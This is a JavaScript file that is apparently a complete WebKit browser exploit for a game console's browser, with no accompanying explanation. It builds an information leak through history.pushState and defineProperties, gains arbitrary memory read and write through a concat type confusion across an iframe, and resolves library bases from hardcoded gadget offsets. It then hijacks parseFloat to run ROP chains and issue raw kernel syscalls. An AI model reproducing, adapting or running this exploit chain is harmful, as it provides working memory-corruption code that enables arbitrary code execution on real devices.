var p;
var s = {};
var g = {};
var gc = {
 "pop_r8": 96709,
 "pop_r9": 12268047,
 "pop_rax": 17397,
 "pop_rcx": 339545,
 "pop_rdx": 1826852,
 "pop_rsi": 586634,
 "pop_rdi": 232890,
 "pop_rsp": 124551,
 "jmp_rax": 130,
 "jmp_rdi": 2711166,
 "mov_rdx_rax": 3488561,
 "mov_rdi_rax": 22692143,
 "mov_rax_rdx": 1896224,
 "mov_rbp_rsp": 985418,
 "mov__rdi__rax": 3857131,
 "mov__rdi__rsi": 146114,
 "mov__rax__rsi": 2451047,
 "mov_rax__rax__": 444474,
 "mov_rax__rdi__": 290553,
 "add_rax_rsi": 1384646,
 "and_rax_rsi": 22481823,
 "add_rdi_rax": 5593055,
 "jop": 800720,
 "ret": 60,
 "stack_chk_fail": 200,
 "setjmp": 5368
};
window.onerror = function (e) {
 if (e.startsWith("Error:") == true) {
  alert(e);
 } else {
  location.reload();
 }
};

var rop = function () {
 this.stack = new Uint32Array(65536);
 this.stackBase = p.read8(p.leakval(this.stack).add32(16));
 this.count = 0;
 this.clear = function () {
  this.count = 0;
  this.runtime = undefined;
  for (var i = 0; i < 4080 / 2; i++) {
   p.write8(this.stackBase.add32(i * 8), 0);
  }
 };
 this.pushSymbolic = function () {
  this.count++;
  return this.count - 1;
 };
 this.finalizeSymbolic = function (idx, val) {
  p.write8(this.stackBase.add32(idx * 8), val);
 };
 this.push = function (val) {
  this.finalizeSymbolic(this.pushSymbolic(), val);
 };
 this.push_write8 = function (where, what) {
  this.push(g.pop_rdi);
  this.push(where);
  this.push(g.pop_rsi);
  this.push(what);
  this.push(g.mov__rdi__rsi);
 };
 this.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
  if (rdi !== undefined) {
   this.push(g.pop_rdi);
   this.push(rdi);
  }
  if (rsi !== undefined) {
   this.push(g.pop_rsi);
   this.push(rsi);
  }
  if (rdx !== undefined) {
   this.push(g.pop_rdx);
   this.push(rdx);
  }
  if (rcx !== undefined) {
   this.push(g.pop_rcx);
   this.push(rcx);
  }
  if (r8 !== undefined) {
   this.push(g.pop_r8);
   this.push(r8);
  }
  if (r9 !== undefined) {
   this.push(g.pop_r9);
   this.push(r9);
  }
  this.push(rip);
  return this;
 };
 this.run = function () {
  var retv = p.loadchain(this, this.notimes);
  this.clear();
  return retv;
 };
 return this;
};

function makeid() {
 var text = "";
 var possible = "ABCDFGHIJKMNOPQRSTUVWXYZLEefulabcdghijkmnopqrstvwxyz0123456789";
 for (var i = 0; i < 8; i++) {
  text += possible.charAt(Math.floor(Math.random() * possible.length));
 }
 return text;
}
var instancespr = [];
for (var i = 0; i < 4096; i++) {
 instancespr[i] = new Uint32Array(1);
 instancespr[i][makeid()] = 50057;
}
var _dview;
function u2d(low, hi) {
 if (!_dview)
  _dview = new DataView(new ArrayBuffer(16));
 _dview.setUint32(0, hi);
 _dview.setUint32(4, low);
 return _dview.getFloat64(0);
}
function zeroFill(number, width) {
 width -= number.toString().length;
 if (width > 0) {
  return new Array(width + (/\./.test(number) ? 2 : 1)).join("0") + number;
 }
 return number + "";
}
function int64(low, hi) {
 this.low = (low >>> 0);
 this.hi = (hi >>> 0);
 this.add32 = function (val) {
  var new_lo = (((this.low >>> 0) + val) & 4294967295) >>> 0;
  var new_hi = (this.hi >>> 0);
  if (new_lo < this.low) {
   new_hi++;
  }
  return new int64(new_lo, new_hi);
 };
 this.add32inplace = function (val) {
  var new_lo = (((this.low >>> 0) + val) & 4294967295) >>> 0;
  var new_hi = (this.hi >>> 0);
  if (new_lo < this.low) {
   new_hi++;
  }
  this.hi = new_hi;
  this.low = new_lo;
 };
 this.sub32 = function (val) {
  var new_lo = (((this.low >>> 0) - val) & 4294967295) >>> 0;
  var new_hi = (this.hi >>> 0);
  if (new_lo > (this.low) & 4294967295) {
   new_hi--;
  }
  return new int64(new_lo, new_hi);
 };
 this.sub32inplace = function (val) {
  var new_lo = (((this.low >>> 0) - val) & 4294967295) >>> 0;
  var new_hi = (this.hi >>> 0);
  if (new_lo > (this.low) & 4294967295) {
   new_hi--;
  }
  this.hi = new_hi;
  this.low = new_lo;
 };
 this.toString = function (val) {
  val = 16;
  var lo_str = (this.low >>> 0).toString(val);
  var hi_str = (this.hi >>> 0).toString(val);
  if (this.hi == 0)
   return lo_str;
  else {
   lo_str = zeroFill(lo_str, 8);
  }
  return hi_str + lo_str;
 };
 return this;
}
var nogc = [];
var tgt = {
 a: 0,
 b: 0,
 c: 0,
 d: 0
};
var y = new ImageData(1, 16384);
postMessage("", "*", [y.data.buffer]);
var props = {};
for (var i = 0; i < 16384 / 2; ) {
 props[i++] = {
  value: 1111638594
 };
 props[i++] = {
  value: tgt
 };
}
var foundLeak = undefined;
var foundIndex = 0;
var maxCount = 256;
while (foundLeak == undefined && maxCount > 0) {
 maxCount--;
 history.pushState(y, "");
 Object.defineProperties({}, props);
 var leak = new Uint32Array(history.state.data.buffer);
 for (var i = 0; i < leak.length - 6; i++) {
  if (leak[i] == 1111638594 && leak[i + 1] == 4294901760 && leak[i + 2] == 0 && leak[i + 3] == 0 && leak[i + 4] == 0 && leak[i + 5] == 0 && leak[i + 6] == 14 && leak[i + 7] == 0 && leak[i + 10] == 0 && leak[i + 11] == 0 && leak[i + 12] == 0 && leak[i + 13] == 0 && leak[i + 14] == 14 && leak[i + 15] == 0) {
   foundIndex = i;
   foundLeak = leak;
   break;
  }
 }
}
if (!foundLeak) {
 throw new Error("infoleak fail");
}
Array.prototype.__defineGetter__(100, () => 1);
var firstLeak = Array.prototype.slice.call(foundLeak, foundIndex, foundIndex + 64);
var leakJSVal = new int64(firstLeak[8], firstLeak[9]);
var f = document.body.appendChild(document.createElement("iframe"));
var a = new f.contentWindow.Array(13.37, 13.37);
var b = new f.contentWindow.Array(u2d(leakJSVal.low + 16, leakJSVal.hi), 13.37);
var cpyrght = "L.e.e.f.u.l";
var master = new Uint32Array(4096);
var slave = new Uint32Array(4096);
var leakval_u32 = new Uint32Array(4096);
var leakval_helper = [slave, 2, 3, 4, 5, 6, 7, 8, 9, 10];
tgt.a = u2d(2048, 23077632);
tgt.b = 0;
tgt.c = leakval_helper;
tgt.d = 4919;
var c = Array.prototype.concat.call(a, b);
document.body.removeChild(f);
var hax = c[0];
c[0] = 0;
tgt.c = c;
hax[2] = 0;
hax[3] = 0;
Object.defineProperty(Array.prototype, 100, {
 get: undefined
});
tgt.c = leakval_helper;
var butterfly = new int64(hax[2], hax[3]);
butterfly.low += 16;
tgt.c = leakval_u32;
var lkv_u32_old = new int64(hax[4], hax[5]);
hax[4] = butterfly.low;
hax[5] = butterfly.hi;
tgt.c = master;
hax[4] = leakval_u32[0];
hax[5] = leakval_u32[1];
var a2sb = new int64(master[4], master[5]);
tgt.c = leakval_u32;
hax[4] = lkv_u32_old.low;
hax[5] = lkv_u32_old.hi;
tgt.c = 0;
hax = 0;
var p = {
 write8: function (addr, val) {
  master[4] = addr.low;
  master[5] = addr.hi;
  if (val instanceof int64) {
   slave[0] = val.low;
   slave[1] = val.hi;
  } else {
   slave[0] = val;
   slave[1] = 0;
  }
  master[4] = a2sb.low;
  master[5] = a2sb.hi;
 },
 write4: function (addr, val) {
  master[4] = addr.low;
  master[5] = addr.hi;
  slave[0] = val;
  master[4] = a2sb.low;
  master[5] = a2sb.hi;
 },
 read8: function (addr) {
  master[4] = addr.low;
  master[5] = addr.hi;
  var rtv = new int64(slave[0], slave[1]);
  master[4] = a2sb.low;
  master[5] = a2sb.hi;
  return rtv;
 },
 read4: function (addr) {
  master[4] = addr.low;
  master[5] = addr.hi;
  var rtv = slave[0];
  master[4] = a2sb.low;
  master[5] = a2sb.hi;
  return rtv;
 },
 leakval: function (jsval) {
  leakval_helper[0] = jsval;
  var rtv = this.read8(butterfly);
  this.write8(butterfly, new int64(1094795585, 4294901760));
  return rtv;
 }
};
var get_jmptgt = function (addr) {
 var z = p.read4(addr) & 65535;
 var y = p.read4(addr.add32(2));
 if (z != 9727)
  return 0;
 return addr.add32(y + 6);
};
p.leakfunc = function (func) {
  var fptr_store = p.leakval(func);
  return (p.read8(fptr_store.add32(24))).add32(64);
 };
 var parseFloatStore = p.leakfunc(parseFloat);
 var webKitBase = p.read8(parseFloatStore);
 webKitBase.low &= 4294963200;
 webKitBase.sub32inplace(5881856 - 147456);
 var o2wk = function (o) {
  return webKitBase.add32(o);
 };
 for (var gn in gc) {
  if (gc.hasOwnProperty(gn)) {
   g[gn] = o2wk(gc[gn]);
  }
 }
 var libKernelBase = p.read8(get_jmptgt(g.stack_chk_fail));
 libKernelBase.low &= 4294963200;
 libKernelBase.sub32inplace(53248 + 16384);
 var wkview = new Uint8Array(4096);
 var wkstr = p.leakval(wkview).add32(16);
 p.write8(wkstr, webKitBase);
 p.write4(wkstr.add32(8), 57131008);
 var hold1;
 var hold2;
 var holdz;
 var holdz1;
 while (1) {
  hold1 = {
   a: 0,
   b: 0,
   c: 0,
   d: 0
  };
  hold2 = {
   a: 0,
   b: 0,
   c: 0,
   d: 0
  };
  holdz1 = p.leakval(hold2);
  holdz = p.leakval(hold1);
  if (holdz.low - 48 == holdz1.low)
   break;
 }
 var pushframe = [];
 pushframe.length = 128;
 var funcbuf;
 var funcbuf32 = new Uint32Array(256);
 nogc.push(funcbuf32);
 var launch_chain = function (chain) {
  var stackPointer = 0;
  var stackCookie = 0;
  var orig_reenter_rip = 0;
  var reenter_help = {
   length: {
    valueOf: function () {
     orig_reenter_rip = p.read8(stackPointer);
     stackCookie = p.read8(stackPointer.add32(8));
     var returnToFrame = stackPointer;
     var ocnt = chain.count;
     chain.push_write8(stackPointer, orig_reenter_rip);
     chain.push_write8(stackPointer.add32(8), stackCookie);
     if (chain.runtime)
      returnToFrame = chain.runtime(stackPointer);
     chain.push(g.pop_rsp);
     chain.push(returnToFrame);
     chain.count = ocnt;
     p.write8(stackPointer, (g.pop_rsp));
     p.write8(stackPointer.add32(8), chain.stackBase);
    }
   }
  };
  funcbuf = p.read8(p.leakval(funcbuf32).add32(16));
  p.write8(funcbuf.add32(48), g.setjmp);
  p.write8(funcbuf.add32(128), g.jop);
  p.write8(funcbuf, funcbuf);
  p.write8(parseFloatStore, g.jop);
  var orig_hold = p.read8(holdz1);
  var orig_hold48 = p.read8(holdz1.add32(72));
  p.write8(holdz1, funcbuf.add32(80));
  p.write8(holdz1.add32(72), funcbuf);
  parseFloat(hold2, hold2, hold2, hold2, hold2, hold2);
  p.write8(holdz1, orig_hold);
  p.write8(holdz1.add32(72), orig_hold48);
  stackPointer = p.read8(funcbuf.add32(16));
  rtv = Array.prototype.splice.apply(reenter_help);
  return p.leakval(rtv);
 };
 p.loadchain = launch_chain;
 var kview = new Uint8Array(4096);
 var kstr = p.leakval(kview).add32(16);
 p.write8(kstr, libKernelBase);
 p.write4(kstr.add32(8), 262144);
 var countbytes;
 for (var i = 0; i < 262144; i++) {
  if (kview[i] == 114 && kview[i + 1] == 100 && kview[i + 2] == 108 && kview[i + 3] == 111 && kview[i + 4] == 99) {
   countbytes = i;
   break;
  }
 }
 p.write4(kstr.add32(8), countbytes + 32);
 var dview32 = new Uint32Array(1);
 var dview8 = new Uint8Array(dview32.buffer);
 for (var i = 0; i < countbytes; i++) {
  if (kview[i] == 72 && kview[i + 1] == 199 && kview[i + 2] == 192 && kview[i + 7] == 73 && kview[i + 8] == 137 && kview[i + 9] == 202 && kview[i + 10] == 15 && kview[i + 11] == 5) {
   dview8[0] = kview[i + 3];
   dview8[1] = kview[i + 4];
   dview8[2] = kview[i + 5];
   dview8[3] = kview[i + 6];
   var syscallno = dview32[0];
   s[syscallno] = libKernelBase.add32(i);
  }
 }
 var chain = new rop();
 var returnvalue;
 p.fcall_ = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
  chain.clear();
  chain.notimes = this.next_notime;
  this.next_notime = 1;
  chain.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
  chain.push(g.pop_rdi);
  chain.push(chain.stackBase.add32(16376));
  chain.push(g.mov__rdi__rax);
  chain.push(g.pop_rax);
  chain.push(p.leakval(1094795842));
  if (chain.run().low != 1094795842) {
   throw new Error("unexpected rop behaviour");
  }
  returnvalue = p.read8(chain.stackBase.add32(16376));
 };
 p.fcall = function () {
  p.fcall_.apply(this, arguments);
  return returnvalue;
 };
 p.readstr = function (addr) {
  var addr_ = addr.add32(0);
  var rd = p.read4(addr_);
  var buf = "";
  while (rd & 255) {
   buf += String.fromCharCode(rd & 255);
   addr_.add32inplace(1);
   rd = p.read4(addr_);
  }
  return buf;
 };
 p.syscall = function (sysc, rdi, rsi, rdx, rcx, r8, r9) {
  if (typeof sysc != "number") {
   throw new Error("invalid syscall");
  }
  var off = s[sysc];
  if (off == undefined) {
   throw new Error("invalid syscall");
  }
  return p.fcall(off, rdi, rsi, rdx, rcx, r8, r9);
 };
 p.sptr = function (str) {
  var bufView = new Uint8Array(str.length + 1);
  for (var i = 0; i < str.length; i++) {
   bufView[i] = str.charCodeAt(i) & 255;
  }
  nogc.push(bufView);
  return p.read8(p.leakval(bufView).add32(16));
 };
 p.malloc = function (sz) {
  var backing = new Uint8Array(65536 + sz);
  nogc.push(backing);
  var ptr = p.read8(p.leakval(backing).add32(16));
  ptr.backing = backing;
  return ptr;
 };
 p.stringify = function (str) {
  var bufView = new Uint8Array(str.length + 1);
  for (var i = 0; i < str.length; i++) {
   bufView[i] = str.charCodeAt(i) & 0xFF;
  }
  window.nogc.push(bufView);
  return p.read8(p.leakval(bufView).add32(0x10));
 };
 p.malloc32 = function (sz) {
  var backing = new Uint8Array(65536 + sz * 4);
  nogc.push(backing);
  var ptr = p.read8(p.leakval(backing).add32(16));
  ptr.backing = new Uint32Array(backing.buffer);
  return ptr;
 };
 
window.onload=setTimeout(postWebkit,500);
